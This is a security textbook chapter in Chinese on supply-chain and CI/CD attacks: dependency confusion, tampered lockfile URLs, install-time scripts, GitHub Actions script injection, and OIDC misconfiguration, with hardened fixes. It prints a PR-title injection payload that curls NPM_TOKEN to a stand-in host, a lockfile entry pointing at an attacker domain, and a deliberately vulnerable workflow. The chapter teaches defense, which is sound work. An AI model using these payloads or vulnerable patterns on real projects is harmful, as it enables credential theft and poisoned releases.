# 第 19 章：軟體供應鏈與 CI/CD 管線攻防

在日常開發裡，大家很容易把 CI/CD 管線當成一條單純的自動化輸送帶，覺得只要有了 `package-lock.json` 跟 `Cargo.lock`，建置結果就一定安全又可重現。

但站在攻擊者的角度來看，**CI/CD 管線往往是整間公司裡集中了最多跨環境最高權限的信任放大器**。它的一頭直接摸著外部不可信的輸入（第三方開源套件、外部 Pull Request 的標題與分支名、社群維護的 Action 模組），另一頭卻緊握著生產環境最敏感的鑰匙（`NPM_TOKEN`、Container Registry 推播權杖、雲端部署角色），而且它吐出來的二進位檔與容器映像檔，會被直接部署到所有線上節點去跑。

一旦握有簽章與發布權限的建置節點失守，攻擊者根本不需要辛苦去找線上服務的記憶體漏洞，就能把後門直接塞進正式建置產物裡，蓋上合法的數位簽章一路送到生產環境。本章就從套件解析、建置期腳本執行到 GitHub Actions 的運作細節，拆解 **NexusPay** monorepo（包含 TypeScript API 閘道與 Rust/C 原生解析模組 `libnexus-parse`）的供應鏈投毒手法與防禦邊界。

---

## 從你已知的出發

為什麼一個連專案原始碼都沒改、甚至在 GitHub Actions 裡連 `actions/checkout` 都沒呼叫的外部 Fork Pull Request，只靠著一段 **45 個字元的 PR 標題**，就能在幾秒鐘內把倉庫裡的 `NPM_TOKEN` 明文偷走？又或者，明明 CI 已經嚴格規定只准跑 `npm ci` 和 `cargo check`，為什麼還是會在還沒啟動服務前就被執行任意惡意指令？

因為整條 CI/CD 建置管線是一張有向無環圖（DAG），這張圖的信任邊界隨時會被三種常見破口鑿穿：第一是把 `${{ github.event.pull_request.title }}` 直接寫進 `run:` 腳本，Runner 在啟動 `bash` 前先做純文字替換，讓標題裡的分號與 `curl` 直接變成 Shell 指令；第二是內部套件沒綁死專屬來源，讓公有庫上的高版本同名套件直接蓋過公司內部套件；第三則是安裝與編譯本身就是程式執行，不管是 npm 的 `postinstall` 還是 Rust 的 `build.rs` 與程序巨集（`proc_macro`），在安裝或型別檢查的那一刻早就拿著 Runner 的完整權限跑起來了。

---

## 機制與推導

### 攻擊者目標與實質影響

在 **OWASP Top 10:2025** 裡，「**A03: Software Supply Chain Failures**」（軟體供應鏈失效）已經被拉出來列為獨立的高風險大類。攻擊者盯上軟體供應鏈與 CI/CD 管線時，想拿到的好處分為三個層次：

第一層是**搶走發布憑證與雲端部署大權**。直接從 CI Runner 的環境變數或行程記憶體裡，把 `NPM_TOKEN`、Docker Registry 寫入權杖、程式碼簽章私鑰或雲端 IAM 憑證掏出來。拿到這些鑰匙後，攻擊者根本不用管你的 Code Review 流程，就能直接往公私有 Registry 推播塞了後門的新版套件，或順著第 18 章講過的 IAM 信任鏈一路接管雲端控制平面。

第二層是**對建置產物投毒，引爆大規模下游感染**。在建置過程中偷改 `@nexuspay/sdk` 這類內部或外部套件，或是在編譯階段掉包 `libnexus-parse.so` 的輸出目的檔，讓最後包出來的容器映像檔天生自帶後門。這種打法完全繞過了線上服務的權限檢查、WAF 與輸入驗證（執行期應用層 RCE 見第 8 章與第 13 章，本章專注在建置與交付層的注入）；只要下游微服務或客戶拉取並部署了這份產物，一旦跑進被動過手腳的程式碼路徑，就會直接以該服務的執行身分被植入後門。

第三層則是**深層潛伏與躲避審查**。例如偷改 `.github/workflows/*.yml`、弄髒 Self-hosted Runner 宿主硬碟上的快取目錄，或是在幾千行的 Lockfile diff 裡偷偷換掉一行 tarball 下載網址。這樣一來，惡意行為只會在建置機上發作，業務原始碼裡連半行可疑的 code 都找不到，讓資安團隊事後追查與清理難上加難。

```
[外部不可信輸入]                [CI/CD 建置 DAG]                 [高權限下游影響]
PR 標題 / 分支名  ──(Script Injection)──┐
第三方 Action @v4 ──(Tag 劫持)──────────┼──▶ [CI Runner (握有 Secrets)] ──▶ 竊取 NPM_TOKEN / OIDC
公有 npm 搶註套件 ──(Dep. Confusion)────┤       │                             │
Lockfile 竄改     ──(postinstall)───────┘       ▼                             ▼
                                         產出遭投毒的產物 ──────────────▶ 污染容器映像檔與生產叢集
```

---

### 套件解析與 Dependency Confusion 機制

現在的後端專案幾乎都會同時用到「公有開源套件」跟「公司內部自己寫的私有套件」。像在 NexusPay monorepo 裡，核心結算邏輯就依賴內部套件 `nexuspay-ledger-core`，其他工具則從公有 npm 與 `crates.io` 拉下來。

**Dependency Confusion**（依賴混淆）之所以會發生，就是因為套件管理器沒有把「這個套件名稱到底該去哪個 Registry 下載」死死綁定；而且當私有代理伺服器同時從公有與私有庫找到同名套件時，解析器預設往往只看誰的語意化版本號（SemVer）比較高，就挑誰下來裝。

#### npm 的 Registry 解析盲點

如果工程師當初命名內部套件時，沒有加上公司的組織命名空間（Scope，像 `@nexuspay/ledger-core`），而是直接取了一個沒前綴的名字 `nexuspay-ledger-core`，然後只靠專案根目錄的 `.npmrc` 把 registry 指到公司內部的 Verdaccio 或 Artifactory，災難就埋下了：

```json
// package.json 裡看似正常的內部套件宣告 (內部目前只出到 1.4.2)
{
  "dependencies": {
    "nexuspay-ledger-core": "^1.4.2"
  }
}
```

首先，公司內部的私有 Registry 通常設成「Proxy + Private」混合模式（自己沒有的套件就往公有 `registry.npmjs.org` 轉發查詢），或者哪天有開發者在本機忘了設 `.npmrc` 就直接跑安裝。

更要命的是，就算有透過企業 Proxy，很多代理預設設定或安裝工具（像特定配置下的 `npm`、`yarn`，或是 Python 的 `pip --extra-index-url`）會同時去問公有庫跟私有庫「你們有哪些版本？」，然後**直接挑符合範圍裡面版本號最高的那一個**。

這時候，攻擊者只要從不小心公開的 `package.json`、前端網頁的 sourcemap 或報錯訊息裡，瞄到你們內部有個套件叫 `nexuspay-ledger-core`（內部版本 `1.4.2`），他馬上就去公有 `npmjs.org` 搶註一個一模一樣的名字，然後直接發一個超高版本號。

舉例來說，如果版本範圍沒鎖上界（像 `*`、`>=1.0.0`），或是有人直接跑沒指定版本的 `npm install nexuspay-ledger-core`，他就發 `99.0.0` 並把公有 `latest` 標籤指過去；要是看到你們寫 `^1.4.2`，他就發一個符合相容範圍的 `1.99.0`。只要 CI Runner 或開發者在沒有 Lockfile 鎖死的狀態下觸發解析，而聚合代理又把公有庫的版本一併塞進候選清單，解析器一看 `99.0.0 > 1.4.2`（或 `1.99.0 > 1.4.2`），二話不說就把公有庫上的惡意套件拉進公司內網了。

#### Cargo 與 `.cargo/config.toml` 的解析邊界

換到 Rust 生態系也一樣。`Cargo.toml` 預設會把所有沒特別註明來源的 crate 通通送去公有的 `crates.io` 找。如果 NexusPay 的 `libnexus-parse` 用到了內部私有 Registry，就必須在 `.cargo/config.toml` 裡定義好 `[registries.<name>]`，而且在 `Cargo.toml` 宣告依賴時，每一個私有套件都要明明白白寫上 `registry = "<name>"`。

這裡最常踩到兩個坑：

第一個坑是**漏寫 `registry` 屬性**。工程師在 `Cargo.toml` 裡順手只寫了 `nexus-tlv-helper = "0.3.1"`，忘了加 `registry = "nexuspay"`。只要當時沒設來源替換（source replacement）也沒有本地鎖定快取，Cargo 就會照預設規矩跑去公有的 `crates.io` 問；要是這個名字在 `crates.io` 上還沒人用，攻擊者一搶註，下次重新解析時就會直接中招。

第二個坑則是**測試用的 `[patch]` 忘了刪**。如果在專案根目錄留下當初除錯用的 `[patch.crates-io]`，或是不小心把 `source.crates-io.replace-with` 指向了沒驗證過的外部位址，特定 crate 的下載來源就會在不知不覺中被偷天換日。

---

### Lockfile 篡改與建置期執行（postinstall / build.rs）

很多團隊聽完 Dependency Confusion 後會拍胸脯說：「沒關係，我們在 CI 裡一律強制跑 `npm ci` 跟 `cargo build --locked`，只要有 Lockfile 鎖死就萬無一失了吧？」

這句話漏看了兩個殘酷的事實：第一，**Lockfile 只負責核對「抓下來的檔案跟鎖定檔上寫的雜湊一不一樣」，它根本不知道那個網址是不是正牌的官方來源**；第二，**套件在「安裝與編譯」的那一秒，就已經擁有完整的程式碼執行權了。**

#### Lockfile Diff 的審計盲區

打開 Node.js 的 `package-lock.json`，每一個遠端套件項目裡面都有兩個關鍵欄位：`resolved`（記錄 tarball 從哪個 URL 下載）跟 `integrity`（記錄這個 tarball 的 SRI 雜湊值，現在 npm 預設都是 `sha512-...`）。

試想一下日常開發場景：有個人發了一張 PR 說要升級某個小套件，連帶自動產生了三千行的 `package-lock.json` 變更。做 Code Review 的同事通常只會看 `package.json` 那兩行版本號沒問題，至於那三千行被 GitHub 摺疊起來的 `package-lock.json`，十之八九都是直接跳過按 Approve。

如果發 PR 的人是外部攻擊者（或是某個開發者的帳號被盜），他只要在保持依賴樹版本相容的前提下，在幾千行的 `package-lock.json` 裡偷偷挑一個深層依賴，把它的 `resolved` 與 `integrity` 改成這樣：

```json
"node_modules/lodash": {
  "version": "4.17.21",
  "resolved": "https://cdn.attacker-domain.test/lodash-4.17.21.tgz",
  "integrity": "sha512-EvilTarballRealSha512HashValueCalculatedByAttacker=="
}
```

當這張 PR 觸發 CI 執行 `npm ci` 時，看看會發生什麼事：
1. `npm ci` 先核對 `package.json` 跟 `package-lock.json` 的版本號相容性——裡面寫的 `version` 依然是 `"4.17.21"`，**完全通過**。
2. `npm ci` 照著 `resolved` 寫的網址，跑去 `cdn.attacker-domain.test` 把惡意 tarball 下載回來，算一遍 SHA-512 跟 `integrity` 比對——因為那個雜湊本來就是攻擊者用惡意 tarball 算出來的，**完全吻合**。
3. `npm ci` 開心地解壓縮，直接進到下一步腳本執行。

#### 還沒跑服務就先中招：建置期任意程式執行面

惡意套件根本不需要乖乖等到你上線執行 `node dist/main.js` 才發作。在建置管線裡，有兩個地方會在安裝或編譯的當下就立刻執行任意指令：

第一個是 **Node.js 的 `preinstall`、`install` 與 `postinstall` 腳本**。只要你跑 `npm install` 或 `npm ci`（且沒加 `--ignore-scripts`），npm 預設就會直接用當下使用者的完整權限呼叫 `/bin/sh`，把套件 `package.json` 裡寫的生命週期腳本跑過一遍。在 CI Runner 上，這代表套件剛裝完，Runner 環境變數裡所有的 Secret 就已經被搬光了。

第二個是 **Rust 的 `build.rs` 與程序巨集（Procedural Macros，`proc_macro`）**。在 Cargo 的世界裡，只要編譯圖裡有任何一個 crate 帶有 `build.rs`，編譯器在編譯那個 crate 之前，就會先把 `build.rs` 編譯成原生執行檔並直接跑起來。更隱蔽的是像 `serde_derive` 這類大家都愛用的衍生巨集（`proc_macro` crate）：為了展開巨集語法，`rustc` 在編譯期會直接把巨集編譯成動態連結函式庫（`.so` / `.dylib`）載入到編譯器自己的行程裡執行！

這意味著什麼？意味著你**根本不需要執行 `cargo run` 或 `cargo test`，只要在 CI 跑一行看起來只做語法檢查的 `cargo check`、甚至只是工程師用 VS Code 打開專案資料夾，讓背景預設會幫你跑建置腳本與展開巨集的 `rust-analyzer` 動起來，寫在 `build.rs` 或巨集裡的惡意程式碼就已經在你的機器上執行完畢了。**

---

### GitHub Actions 執行模型、`pull_request_target` 與 Script Injection

看完套件層，我們把鏡頭轉向 GitHub Actions workflow。在審查企業 CI/CD 管線時，最常抓到的致命破口，幾乎都出在團隊搞混了 PR 觸發器的權限模型，以及小看了 `${{ ... }}` 表達式展開的威力。

#### `pull_request` 與 `pull_request_target` 的生死一線間

針對外部送來的 Pull Request，GitHub Actions 提供了兩種名字長得很像、但安全邊界差了十萬八千里的觸發器：

| 比較項目 | `pull_request`（對外部 Fork PR 的預設待遇） | `pull_request_target` |
|---|---|---|
| 預設跑哪一份 workflow 與程式碼 | PR 合併預覽提交（Merge Commit） | **目標主分支（Base Branch，像是 `main`）** |
| `GITHUB_TOKEN` 預設權限 | 強制降為 `read` 唯讀權限 | **可照倉庫或 workflow 設定拿到 `write` 讀寫大權** |
| 能不能拿倉庫的 `secrets` | **預設完全不給外部 Fork PR 碰 Repository Secrets** | **可以直接讀取基礎倉庫的 Secrets（包含 `NPM_TOKEN`）** |
| 當初設計來幹嘛的 | 安全地編譯並跑外部 PR 的單元測試 | 在受信環境裡幫外部 PR 貼標籤、留歡迎詞等元資料操作 |

看懂這張表，你就能明白最恐怖的災難是怎麼發生的：有些團隊為了讓外部 Fork 送來的 PR 也能在 CI 裡留評論、或是讀私有快取跟金鑰，就把 workflow 頂部的觸發器從 `pull_request` 改成了 `pull_request_target` 並掛上高權限 Secrets；結果卻在下面的步驟裡，順手寫了 `actions/checkout` 並加上 `ref: ${{ github.event.pull_request.head.sha }}`！

這一行寫下去，等於是親手把外部攻擊者還沒經過任何人審查的髒程式碼，直接拉進一個手握 `write` 權限與 `NPM_TOKEN` 的高權限 Runner 裡。只要後面接著跑一行 `npm ci`、`npm test`、`cargo build` 或任何會受 PR 檔案影響的腳本，攻擊者就能把所有 Secret 一網打盡。

#### Expression Injection（Script Injection）的展開陷阱

那如果我們在 `pull_request_target`（或是 `issue_comment`）裡面乖乖忍住，完全不呼叫 `actions/checkout` 去拉 PR 的程式碼，是不是就安全了？

先看看下面這段在 NexusPay monorepo 裡用來檢查 PR 標題格式的 `.github/workflows/pr-audit-notify.yml`：

```yaml
# 漏洞示範：NexusPay .github/workflows/pr-audit-notify.yml
name: PR Metadata Check
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  check-title:
    runs-on: ubuntu-latest
    steps:
      - name: Validate PR title format
        env:
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
        run: |
          echo "PR: ${{ github.event.pull_request.title }}"
```

這段 YAML 看起來再單純不過了，只用 `echo` 印出 PR 標題而已，但它卻是一個標準的 **Script Injection**（命令注入）大洞！

為什麼？因為 GitHub Actions Runner 在真正啟動 `bash -e` 跑 `run:` 裡面的腳本之前，會先在記憶體裡把 YAML 中所有的 `${{ ... }}` 表達式做**純文字替換**，替換完才把整段字串丟給 `bash` 執行。`bash` 根本分不出哪個字是開發者寫的、哪個字是外部使用者填的；只要攻擊者在 PR 標題 `github.event.pull_request.title`、Fork 分支名 `github.event.pull_request.head.ref`、PR 內文 `body` 或 Commit 訊息 `commits[0].message` 裡塞進雙引號、分號或 `$(...)`，就能直接跳出原本的字串，讓 `bash` 乖乖執行他塞進來的任意指令。

下面我們就拿這段 workflow，一個字元一個字元算給你看：攻擊者怎麼只靠一段 **45 字元的 PR 標題**，在完全沒動任何一行程式碼時，直接把 40 字元的 `NPM_TOKEN` 偷回自己家：

```text
=== Worked Example：45 字元 PR 標題 Script Injection 端到端推導 ===

1. 攻擊者於外部 Fork 提交 Pull Request，將 PR 標題設為以下精確 45 字元字串：
   Payload (45 chars):
   x"; curl -s -d "$NPM_TOKEN" https://x.io/c; #

   逐段長度檢核：
   - `x"; `                          ->  4 bytes（閉合原本的雙引號並以分號結束 echo 指令）
   - `curl -s -d "$NPM_TOKEN" `      -> 24 bytes（讀取環境變數 NPM_TOKEN 作為 POST body）
   - `https://x.io/c; #`             -> 17 bytes（外洩目標端點，分號後以 # 註解掉尾端殘留的 "）
   總計：4 + 24 + 17 = 45 bytes（45 個 ASCII 字元）。

2. GitHub Actions 執行階段 1（模板字串預展開，在啟動 bash 前完成）：
   原本指令：echo "PR: ${{ github.event.pull_request.title }}"
   展開結果（單行 56 bytes：固定前綴 `echo "PR: ` 10 bytes + 標題 45 bytes + 結尾 `"` 1 byte）：
   echo "PR: x"; curl -s -d "$NPM_TOKEN" https://x.io/c; #"

3. GitHub Actions 執行階段 2（交由 bash -e -o pipefail 直譯）：
   - 指令 1：echo "PR: x" -> 正常輸出至 stdout，exit code = 0。
   - 指令 2：curl -s -d "$NPM_TOKEN" https://x.io/c ->
     在本章測試模型中，設定 secrets.NPM_TOKEN 為 40 字元測試權杖（`npm_` 前綴 4 bytes + 36 bytes 英數碼），
     Runner 發出 HTTP POST，Content-Length = 40 bytes，直接將明文權杖送達攻擊者伺服器。
   - 指令 3：#" -> 被 bash 視為註解，避免語法錯誤（Syntax Error）觸發非零結束碼。

4. 為何 GitHub Secret Masking 無法攔截？
   GitHub Runner 僅對 stdout / stderr 日誌串流執行 `::add-mask::` 字串替換為 `***`。
   向外發出的網路封包（`curl` HTTP POST body）不經過日誌過濾器，因此 `x.io` 收到完整的 40-byte 明文權杖。

5. 影響半徑（Blast Radius）分析：
   - 憑證層：取得 `NPM_TOKEN` 寫入權限，可發布 `@nexuspay/sdk` 與 `@nexuspay/crypto` 新版號。
   - 產物層：若攻擊者發布相容的新補丁版號（例如 `2.4.1` -> `2.4.2`，且 `2.4.2` 為該範圍內目前最高的可用版本），所有使用 `^2.4.0` 範圍、未鎖定 Lockfile 且重新向該來源解析最高可用版本的下游客戶與微服務，在下次建置並執行到該套件時便會安裝並載入惡意版本 `2.4.2`。
   - 時間視窗：一旦 `pull_request_target` 被事件自動觸發，竊取流程會在自動化 job 啟動後直接執行，無須等待人工審核介入或關閉 PR。
```

你看，整個過程連 3 秒鐘都不到：PR 一送出，`pull_request_target` 自動起跑，模板先把 45 bytes 的標題嵌進 `echo "PR: ..."` 變成 56 bytes 的單行腳本，接著 `bash` 執行中間那段 `curl`，把 40 bytes 的 `NPM_TOKEN` 直接打去 `https://x.io/c`，最後 `#"` 把尾巴原本多出來的雙引號完美註解掉，Job 甚至還亮著綠燈顯示 Pass！等你看到奇怪的 PR 標題跑去把它關掉時，權杖早就在別人口袋裡了。

---

### Runner 隔離破口、持久化與 OIDC 信任鏈

除了在單次 Job 裡偷 Secret，Runner 本身的執行環境有沒有清乾淨，以及它跟雲端換憑證時的 OIDC 規則怎麼寫，同樣決定了攻擊者能不能在你的建置機裡長住下來。

#### Ephemeral Runner vs Self-hosted Runner 的跨任務污染

GitHub 官方提供的託管虛擬機（GitHub-hosted Runner）是**用完即丟的（Ephemeral）**：每跑一個 Job 就開一台全新乾淨的 VM，跑完當場銷毀。但很多公司為了編譯超肥的 monorepo（像是 NexusPay 裡面要編譯 Rust 跟 C++），或是為了讓 CI 能直接連進公司內網機器，會自己架設 **Self-hosted Runner**。

如果自己架的 Self-hosted Runner 沒有做成「跑完一個 Job 就自動銷毀重建」（也就是處於 Non-ephemeral 常駐狀態），馬上就會踩到三個跨任務污染（Cross-job Contamination）的大雷：

第一是**硬碟工作區殘留**。上一個外部 PR 測試完留在磁碟上的檔案、被偷偷改過的 `.git/hooks/`，或是預先編好塞進快取目錄的惡意 `.o` / `.a` 目的檔，等一下跑 `main` 分支正式打包時就會被直接撿起來用。

第二是**背景行程潛伏**。如果 Runner 在 Job 結束時沒有把所有子行程殺乾淨，而且不同 Job 都共用同一個 Linux 帳號（比如 `runner`），那低權限的 PR 測試任務就可以偷偷在背景起一個 daemon 迴圈，專門盯著 `/home/runner/_work` 或 `/proc/<pid>/environ` 看；一等到下一個有生產環境金鑰的部署任務排進同一台機器，馬上從記憶體或環境變數裡把金鑰抄走。

第三則是**同一個 Job 裡的跨步驟環境污染**（`GITHUB_ENV` 與 `GITHUB_PATH`）。就算用的是官方用完即丟的 Ephemeral Runner，如果前面的步驟 A 讓外部不可信輸入有機會寫進 `$GITHUB_ENV`（直接塞入 `LD_PRELOAD=/tmp/evil.so` 或 `NODE_OPTIONS` 這類危險變數）或是寫進 `$GITHUB_PATH`（把攻擊者可控的 `/tmp/bin` 排到 `PATH` 的最前面），那等到後面的步驟 B 呼叫 `git` 或 `npm` 時，跑起來的早就不是系統原本的程式了。

#### OIDC 無長效金鑰部署與 `sub` 萬用字元破口

為了解決「把永不過期的 `AWS_ACCESS_KEY_ID` 跟 `NPM_TOKEN` 放在 GitHub Secrets 裡太危險」的問題，現在最標準的做法是全面改走 **OIDC**（OpenID Connect）聯邦身分驗證。

它的流程很乾淨：當一個被授予 `id-token: write` 權限的 Job 開跑時，GitHub 的 OIDC Provider 會當場簽一張短效的 JWT 給它，裡面用明文寫著這次建置的身分宣告（Claims）：
- `iss`：固定為 `https://token.actions.githubusercontent.com`
- `aud`：要拿去換憑證的目標受眾（例如 AWS STS 就是 `sts.amazonaws.com`）
- `sub`：最關鍵的主體字串，預設格式會寫明是哪個倉庫的哪個分支或環境，像 `repo:nexuspay/core:ref:refs/heads/main` 或 `repo:nexuspay/core:environment:production`（也可以用 GitHub OIDC customization template 把 `job_workflow_ref` 等欄位塞進 `sub` 裡）
- `job_workflow_ref`：實際執行這次任務的 workflow 檔案路徑與版本（例如 `nexuspay/core/.github/workflows/deploy.yml@refs/heads/main`）

拿著這張短效 JWT 去找 AWS STS（呼叫 `AssumeRoleWithWebIdentity`）或 npm Trusted Publishers，對方只要驗過簽章跟裡面的 Claims 符合條件，就會發下短效臨時憑證。

看起來很完美對吧？但偏偏很多工程師在寫 AWS IAM Role 的 Trust Policy 時，為了省事加了一顆星號 `*`：

```json
// 危險設定：把 sub 寫成 repo:nexuspay/core:* 萬用字元
"Condition": {
  "StringEquals": {
    "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
  },
  "StringLike": {
    "token.actions.githubusercontent.com:sub": "repo:nexuspay/core:*"
  }
}
```

看看那行 `"repo:nexuspay/core:*"`，這顆星號直接把大門敞開給整個倉庫：**只要是在 `nexuspay/core` 這個倉庫裡，不管是誰開的測試分支、哪個舊 Tag、甚至是外部 PR 觸發的 workflow，只要那個 workflow 有 `id-token: write` 權限，它領到的 OIDC JWT 就通通符合 `repo:nexuspay/core:*`，當場就能跟 AWS 換到生產環境的部署大權！**

要守住 OIDC 邊界，Trust Policy 裡除了檢查 `aud`，還必須把 `sub` 死死鎖在特定環境或受保護的主分支上（例如只准 `repo:nexuspay/core:environment:production` 或 `repo:nexuspay/core:ref:refs/heads/main`，或是透過自訂 `sub` 範本綁死特定的發布專用 workflow），再搭配 GitHub Environment 的「Required Reviewers」人工審批關卡，才能確保只有真正核准過的發布流程換得到生產憑證。

---

### 產物可驗證性：SLSA、Sigstore/Cosign 與 SBOM

把 Git 倉庫、套件與 Workflow 都鎖緊之後，整個供應鏈還差最後一塊拼圖：**當生產環境的 Kubernetes 叢集準備把一個容器映像檔拉下來跑的時候，它要怎麼確認眼前這個映像檔，真的是由我們信任的 CI 管線從某個合法 Git Commit 編譯出來的，而不是有人偷改了 Registry 裡面的檔案？**

這就靠現代產物可驗證性（Artifact Integrity & Provenance）的三劍客來把關了：

第一位是 **SLSA**（Supply-chain Levels for Software Artifacts，建置來源安全等級）。SLSA 把建置安全分成好幾級：L1 只要求有產出建置來源證明（Provenance）；L2 要求由託管建置平台產生並簽章這份證明；而到了 **SLSA Build L3**，則強制規定「跑建置指令的環境，跟負責簽發 Provenance 的控制平面必須徹底隔離」。

也就是說，你在 `Makefile` 或 `npm run build` 裡跑的腳本，**絕對摸不到用來簽發 Provenance 的私鑰**。這樣就算建置過程中有某個套件被投毒了，惡意腳本也絕對沒辦法自己偽造或偷改 Provenance（當然，下游在驗證時還是得核對 Provenance 裡寫的來源倉庫、Commit 與 workflow 身分是不是預期的那一個）。

第二位是 **Sigstore 與 Cosign 無金鑰簽章**（Keyless Signing）。以前用 GPG 或固定私鑰幫映像檔簽章，最怕私鑰外洩或忘了輪換；Sigstore 則把三樣東西串起來，做到完全不用管長期私鑰：
1. CI Job 先透過剛剛講的 **OIDC** 拿到當次建置專屬的短效 JWT。
2. 拿這張 JWT 去找 **Fulcio**（Sigstore 的憑證中心），Fulcio 驗明正身後，當場簽發一張**有效期限極短**（預設只有 **10 分鐘**）的 X.509 程式碼簽章憑證，把你在記憶體裡剛生成的臨時公鑰，跟這次建置的 OIDC 身分綁在一起。
3. **Cosign** 拿這把臨時私鑰，對著容器映像檔的不可變摘要（`@sha256:...`）蓋上數位簽章，然後把簽章、憑證跟時間戳記一併寫進 **Rekor**（一座用 Merkle Tree 打造的不可竄改透明日誌），最後立刻把記憶體裡的臨時私鑰銷毀。等到 Kubernetes 准入控制器（像 Kyverno 或 Policy Controller）要部署時，只要核對映像檔摘要的簽章、確認 Fulcio 憑證上的 OIDC 身分是我們家的正式發布管線，而且簽章時間點確實落在憑證那 10 分鐘的有效期內（由 Rekor 透明日誌作證），就能放行部署。

第三位則是 **SBOM**（Software Bill of Materials，軟體物料清單）與 **VEX**。在建置時用工具產出 CycloneDX 或 SPDX 格式的 SBOM，把映像檔裡所有直接與間接用到的套件版本、來源跟雜湊全記下來（完整度取決於鎖定檔與掃描工具能解析的範圍）。

哪天又爆發像 Log4j 或 XZ Utils 那種核彈級 CVE 時，資安團隊不用把幾百個倉庫拉下來重掃，幾分鐘內就能從已驗證的 SBOM 資料庫裡撈出哪些線上服務有裝那個問題版本；再搭配 **VEX**（Vulnerability Exploitability eXchange）標註「雖然映像檔裡有這個套件，但我們根本沒呼叫到出事的那個函式」，就能省下大把瞎忙修補的時間。不過要切記，沒簽章的 SBOM 一樣可以被掉包，所以務必用 `cosign attest` 把 SBOM 跟映像檔的 `@sha256` 摘要簽在一起驗證。

---

## 故障模式與防禦

把前面拆解的整條供應鏈攻擊面收斂起來，我們在審查 NexusPay 的建置與發布管線時，最核心的工作就是堵住下面這四種故障模式：

| 故障模式 | 為什麼會被打穿 | 真正能鎖死邊界的防線 |
|---|---|---|
| **Dependency Confusion（依賴混淆）** | 內部私有套件沒加 Scope 前綴，或代理伺服器看到公有庫版本號比較高就跑去抓公有庫 | 1. 內部套件一律改用 Scoped 名稱（`@nexuspay/*`），並在 `.npmrc` 把該 Scope 鎖死在私有 Registry。<br>2. 在公有庫預先註冊同名佔位套件（Placeholder）。<br>3. Rust `Cargo.toml` 裡的私有依賴一律顯式寫出 `registry = "nexuspay"`。 |
| **Lockfile 偷換網址與建置期腳本執行** | 人工看 PR 時跳過幾千行的 `package-lock.json`，沒發現 `resolved` 網址被換掉；CI 安裝時預設直接跑 `postinstall` 與 `build.rs` | 1. CI 安裝一律跑 `npm ci --ignore-scripts`，真的需要編譯的原生模組用白名單單獨跑。<br>2. 在 CI 加上自動化檢查腳本，只要 Lockfile 裡的 `resolved` 指到非官方白名單網域就當場退件。<br>3. Rust 專案強制 `cargo build --locked`，並搭配 `cargo-vet` 審查第三方的 `build.rs` 與 `proc_macro`。 |
| **Workflow 權限過大與 Script Injection** | 在 `pull_request_target` 裡 checkout 外部 PR 程式碼來跑；把 `${{ ... }}` 直接塞進 `run:` 腳本；第三方 Action 只鎖可變的 `@v4` 標籤 | 1. 嚴禁在 `pull_request_target` 裡 checkout 並執行外部 PR 程式碼（若用 `workflow_run` 分兩階段，高權限階段拿到上游 Artifact 也只能當純資料驗格式，絕不能拿來執行）。<br>2. 所有外部可控欄位一律先放進步驟的 `env:`，在 Shell 裡只用雙引號 `"$VAR"` 讀取。<br>3. 第三方 Action 一律鎖死 **40 字元完整 Commit SHA**；顯式寫出最小 `permissions` 與 `persist-credentials: false`。 |
| **長效靜態金鑰外洩與 Runner 跨任務污染** | 在 Secrets 裡放永不過期的 `NPM_TOKEN` 與雲端金鑰；多任務共用不會自動重置的 Self-hosted Runner | 1. 全面改走 **OIDC** 短效憑證，雲端 Trust Policy 嚴格核對 `aud` 與精確的 `sub`（綁死 `ref`、`environment` 或自訂 workflow 範本）。<br>2. 正式發布一律用跑完即毀的 Ephemeral Runner，並鎖上對外連線白名單（Egress Filtering）。<br>3. 產出的容器映像檔用 **Cosign（Sigstore）** 蓋上無金鑰簽章並綁定 **SBOM** 與 SLSA Provenance，由 K8s 准入控制器驗過才准上線。 |

### 修補前後對照：把 GitHub Actions Workflow 鎖到滴水不漏

回頭看前面被 45 字元標題一招打穿的 `.github/workflows/pr-audit-notify.yml`。要徹底修好它，絕對不是寫個正規表達式去擋雙引號，而是要一次把**模板插值與 Shell 分離**、**最小化 `GITHUB_TOKEN` 權限**以及**拿掉不該掛的 `NPM_TOKEN`** 三件事同時做好：

```yaml
# 修補後：NexusPay .github/workflows/pr-audit-notify.yml
name: PR Metadata Check
on:
  pull_request_target:
    types: [opened, synchronize]

# 1. 全域收緊預設 GITHUB_TOKEN 權限：僅保留最小唯讀權限，未列出的權限一律為 none
permissions:
  contents: read

jobs:
  check-title:
    runs-on: ubuntu-latest
    # 覆寫此 job 的 GITHUB_TOKEN 權限為僅讀取 PR 元資料
    permissions:
      pull-requests: read
    steps:
      # 2. 若無須存取程式碼，完全不呼叫 actions/checkout；
      #    若必須 checkout base 分支，應顯式加上 persist-credentials: false
      - name: Validate PR title format
        # 3. 不在無必要的高權限 PR 檢查中掛載 NPM_TOKEN 等發布憑證
        env:
          # 4. 透過 env 傳遞不可信輸入，避免預展開直接拼接進 bash 腳本
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: |
          printf 'PR: %s\n' "$PR_TITLE"
```

注意看第 4 點的改法：我們把 `${{ github.event.pull_request.title }}` 從 `run:` 裡面搬到了上面的 `env:`。這樣一改，GitHub Runner 在啟動 `bash` 的時候，是把標題字串直接塞進作業系統行程的 `environ` 環境變數記憶體裡，至於丟給 `bash` 執行的腳本，則是從頭到尾固定不變的一行 `printf 'PR: %s\n' "$PR_TITLE"`。

因為 `bash` 在展開雙引號包住的 `"$PR_TITLE"` 時，只會把它當成單一字串參數的值，**絕對不會再對裡面的內容做第二次語法切詞（Word Splitting）或命令解析**。這時候就算攻擊者把標題取成 `x"; curl ... #`，`printf` 也只會乖乖把這串字原封不動印在螢幕上，資料跟指令從此徹底分家。

另外，在真正負責打包並發布容器映像檔的 workflow 裡，除了要把所有第三方 Action 都鎖死在 **40 字元的完整 Commit SHA**（防止上游作者帳號被盜後偷移 `@v4` 標籤），還要打開 `id-token: write` 權限，讓 Cosign 直接對著映像檔的 `@sha256` 摘要蓋上無金鑰簽章：

```yaml
      - name: Checkout base repository
        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # 鎖死 40 字元 Commit SHA
        with:
          persist-credentials: false

      - name: Install Cosign
        uses: sigstore/cosign-installer@3454372f05248b55d69492f0190c9e64e629d3f3 # 鎖死 40 字元 Commit SHA

      - name: Sign container image digest with Cosign (Keyless OIDC)
        env:
          IMAGE_DIGEST: ${{ steps.build.outputs.image_digest }}
        run: |
